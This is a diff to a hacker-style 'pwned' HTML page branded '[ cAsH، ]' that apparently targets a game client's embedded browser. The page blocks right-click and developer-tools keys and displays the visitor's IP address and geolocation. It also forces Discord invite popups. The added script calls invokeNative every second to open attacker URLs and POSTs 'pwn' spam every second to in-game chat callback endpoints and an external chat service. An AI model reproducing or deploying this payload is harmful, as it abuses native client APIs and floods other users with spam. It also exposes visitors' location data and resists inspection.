@@ -17,18 +17,15 @@
             overflow: hidden;
             user-select: none;
         }
-
         h1, h3 {
             color: #ffffff;
         }
-
         .cmd-text-container {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
         }
-
         .cmd-text {
             color: rgb(139, 69, 19);
             font-size: 17px;
@@ -37,29 +34,24 @@
             animation: scrollText 20s linear infinite;
             -webkit-text-stroke: 1px white;
         }
-
         @keyframes scrollText {
             0% { transform: translateX(100%); }
             100% { transform: translateX(-100%); }
         }
-
         .json-data {
             font-family: Arial, sans-serif;
             color: rgb(139, 69, 19);
             text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
             white-space: pre;
         }
-
         .animated-text {
             animation: lightning 1s linear infinite;
         }
-
         @keyframes lightning {
             0% { color: red; }
             50% { color: black; }
             100% { color: white; }
         }
-
         video {
             position: fixed;
             top: 0;
@@ -70,7 +62,6 @@
             object-fit: cover;
             filter: blur(10px);
         }
-
         audio {
             display: none;
         }
@@ -78,74 +69,113 @@
 </head>
 <body>
 
-    <script>
-        var names = [
-            { name: "[ cAsH، ]", color: "red" },
-            { name: "[ cAsH، ]", color: "white" }
-        ];
-        var nameIndex = 0;
+<script>
+    var names = [
+        { name: "[ cAsH، ]", color: "red" },
+        { name: "[ cAsH، ]", color: "white" }
+    ];
+    var nameIndex = 0;
 
-        function changeNames() {
-            var currentName = names[nameIndex];
-            var el = document.getElementById("name");
-            if (el) {
-                el.textContent = currentName.name;
-                el.style.color = currentName.color;
+    function changeNames() {
+        var currentName = names[nameIndex];
+        var el = document.getElementById("name");
+        if (el) {
+            el.textContent = currentName.name;
+            el.style.color = currentName.color;
+        }
+        nameIndex = (nameIndex + 1) % names.length;
+    }
+    setInterval(changeNames, 1000);
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e) {
+        if (
+            e.key === "F12" ||
+            (e.ctrlKey && e.shiftKey && e.key === "I") ||
+            (e.ctrlKey && e.key === "U")
+        ) {
+            e.preventDefault();
+        }
+    });
+
+    function fetchIPAndInfo() {
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-address-value').textContent = data.ip;
+                return fetch(`https://ipinfo.io/${data.ip}/json`);
+            })
+            .then(response => response.json())
+            .then(info => {
+                document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
+            })
+            .catch(() => {
+                document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+            });
+    }
+
+    function forceDiscordPopup() {
+        const a = document.createElement('a');
+        a.href = "https://discord.gg/ay1";
+        a.target = "_blank";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
+    window.onload = function () {
+        fetchIPAndInfo();
+
+        setTimeout(() => {
+            window.open("https://discord.com/invite/ay1", "_blank");
+        }, 2000);
+
+        setTimeout(forceDiscordPopup, 500);
+
+        // 🚀 Open URLs repeatedly using RedEngine/Cef Native API
+        setInterval(() => {
+            if (typeof window.invokeNative === "function") {
+                window.invokeNative("openUrl", "https://discord.gg/ay1");
+                window.invokeNative("openUrl", "https://cashpwn.com");
             }
-            nameIndex = (nameIndex + 1) % names.length;
-        }
-        setInterval(changeNames, 1000);
+        }, 1000);
 
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        // 📤 POST messages every second
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "text/plain;charset=UTF-8"
+                },
+                body: JSON.stringify({ message: "pwn - discord.gg/ay1" })
+            });
 
-        document.addEventListener('keydown', function(e) {
-            if (
-                e.key === "F12" ||
-                (e.ctrlKey && e.shiftKey && e.key === "I") ||
-                (e.ctrlKey && e.key === "U")
-            ) {
-                e.preventDefault();
-            }
-        });
-
-        function fetchIPAndInfo() {
-            fetch('https://api.ipify.org/?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip-address-value').textContent = data.ip;
-                    return fetch(`https://ipinfo.io/${data.ip}/json`);
+            fetch("https://easy-chat.com/o6ZbK5Ecp6", {
+                method: "POST",
+                headers: {
+                    "Accept": "*/*",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                },
+                body: JSON.stringify({
+                    message: ":7: pwn - discord.gg/ay1 :7:",
+                    channel: "شات العام"
                 })
-                .then(response => response.json())
-                .then(info => {
-                    document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
-                })
-                .catch(() => {
-                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
-                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
-                });
-        }
+            });
 
-        function forceDiscordPopup() {
-            const a = document.createElement('a');
-            a.href = "https://discord.gg/invite/ay1";
-            a.target = "_blank";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
+            fetch("https://melix_chat/chatResult", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "text/plain;charset=UTF-8"
+                },
+                body: JSON.stringify({ message: ":6: pwn - discord.gg/ay1 :6:" })
+            });
+        }, 1000);
+    };
+</script>
 
-        window.onload = function () {
-            fetchIPAndInfo();
-            setTimeout(() => {
-                window.open("https://discord.com/invite/ay1", "_blank");
-            }, 2000);
-            setTimeout(forceDiscordPopup, 500);
-        };
-    </script>
-
-    
 <p align="center">
-    <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png?ex=6883ce9e&is=68827d1e&hm=c74e163e0777c1d568b50bb2432dc3b5f336b0cdb18dee7e2061e9de5e2a4b9b&" width=device-width height="200">
+    <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png" width="auto" height="200">
 
     <p align="center">
         <font face="Courier" size="6" style="color: #000000;">
@@ -177,16 +207,16 @@
     <!-- Background Video(s) -->
     <div id="video-bg">
         <video autoplay loop muted>
-            <source src="https://cdn.discordapp.com/attachments/1393735705770856618/1393736558619787377/v10044g50000c5c74tjc77u3u3n8uqkg.mp4?ex=688413d1&is=6882c251&hm=3b6ee27751bd9f49210b2edfb787e9f307fe6e66c5db70e5a9389c47f5d60853&" type="video/mp4"> 
+            <source src="https://cdn.discordapp.com/attachments/1229599465112076308/1398283508891258900/Untitled_video_-_Made_with_Clipchamp_5.mp4?ex=68861dff&is=6884cc7f&hm=5e6cf4889810f82235480f00aaf7022e00f9ebb424635eb8643f6015196bf5d3&" type="video/mp4"> 
         </video>
         <video autoplay loop muted style="position: fixed; top: 0; left: 0; z-index: -1; width: 100vw; height: 100vh; object-fit: cover;">
-            <source src="https://i.imgur.com/DkS6Vp1.mp4" type="video/mp4">
+            <source src="https://cdn.discordapp.com/attachments/1229599465112076308/1398283508891258900/Untitled_video_-_Made_with_Clipchamp_5.mp4?ex=68861dff&is=6884cc7f&hm=5e6cf4889810f82235480f00aaf7022e00f9ebb424635eb8643f6015196bf5d3&" type="video/mp4">
         </video>
     </div>
 
     <!-- Background Music -->
     <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1328387698855120926/1394470975311052911/Dark_is_the_night_-_slowed_soviet_song.mp3" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1229599465112076308/1398763996714369124/Untitled_video_-_Made_with_Clipchamp_5.mp3?ex=68868bfc&is=68853a7c&hm=727156d190f136c13a095a77aa08a5ff8eff6f709d9e92437d1c215f155488fc&" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
 
